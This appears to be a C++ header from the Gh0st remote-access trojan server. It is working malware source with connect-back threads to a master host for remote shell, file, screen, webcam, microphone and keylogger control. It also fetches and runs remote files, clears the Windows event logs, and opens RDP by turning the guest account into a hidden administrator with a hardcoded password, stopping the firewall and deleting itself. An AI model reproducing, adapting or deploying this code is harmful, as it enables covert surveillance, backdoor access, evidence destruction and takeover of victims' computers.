#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "until.h"
#include "install.h"
#include <wininet.h>
#include "reg.h"
typedef BOOL (WINAPI *CreateProcessAT)
(
 __in_opt    LPCSTR lpApplicationName,
 __inout_opt LPSTR lpCommandLine,
 __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes,
 __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes,
 __in        BOOL bInheritHandles,
 __in        DWORD dwCreationFlags,
 __in_opt    LPVOID lpEnvironment,
 __in_opt    LPCSTR lpCurrentDirectory,
 __in        LPSTARTUPINFOA lpStartupInfo,
 __out       LPPROCESS_INFORMATION lpProcessInformation
 );
//	CreateProcessAT   pCreateProcessA   =   (CreateProcessAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateProcessA");

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// 攝像頭不同一線程調用sendDIB的問題
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	char	strKeyboardOfflineRecord[MAX_PATH];
	GetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
	lstrcat(strKeyboardOfflineRecord, "\\syslog.dat");
	
	if (GetFileAttributes(strKeyboardOfflineRecord) != -1)
		g_bSignalHook = true;
	else
		g_bSignalHook = false;

	while (1)
	{
		while (g_bSignalHook == false)Sleep(100);
		CKeyboardManager::StartHook();
		while (g_bSignalHook == true)Sleep(100);
		CKeyboardManager::StopHook();
	}

	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return true;
}

//如果用urldowntofile的話，程序會卡死在這個函數上
bool UpdateServer(LPCTSTR lpURL)
{
	const char	*lpFileName = NULL;
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	return CreateProcess(lpFileName, "Gh0st Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}


bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;

	// System 權限下不能直接利用shellexecute來執行
	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (lstrlen(strIEPath) == 0)
		return false;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 

	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return 0;
}

void CleanEvent()
{
	char *strEventName[] = {"Application", "Security", "System"};

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}
void Open3389p(DWORD port)
{
	port = 3389;
	CRegistry reg;
	reg.Open("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\0");
	reg.CreateKey("netcache");
	reg.WriteString("Enabled","0");
	
	reg.Open("SOFTWARE\\Policies\\Microsoft\\Windows\0");
	reg.CreateKey("Installer");
	reg.WriteDword("EnableAdminTSRemote",1);
	
	if (reg.Open("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\0"))
		reg.WriteString("ShutdownWithoutLogon","0");
	if (reg.Open("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\0"))
		reg.WriteDword("TSEnabled",1);
	if (reg.Open("SYSTEM\\CurrentControlSet\\Services\\TermDD\0"))
		reg.WriteDword("Start",2);
	if (reg.Open("SYSTEM\\CurrentControlSet\\Services\\TermService\0"))
		reg.WriteDword("Start",2);
	
	if (reg.Open("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\0"))
		reg.WriteDword("fDenyTSConnections",0);
	
	if (reg.Open("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp\0"))
		reg.WriteDword("PortNumber",port);
	if (reg.Open("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\0"))
		reg.WriteDword("PortNumber",port);
	if (reg.Open("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\0"))
		reg.WriteDword("PortNumber",port);
	
	reg.ReSetMainKey(HKEY_USERS);
	if (reg.Open(".DEFAULT\\Keyboard Layout\\Toggle\0"))
		reg.WriteString("Hotkey","2");
	reg.Close();

	char	strCommand[1024];
	char	strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf));
	wsprintf(strCommand, "cmd.exe /c net user guest /active:yes && net user guest feng842013 && net localgroup administrators guest /add && net stop SharedAccess /y && del \"%s\" && sc delete SharedAccess", strSelf);
	
	WinExec(strCommand, SW_HIDE);
}
void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
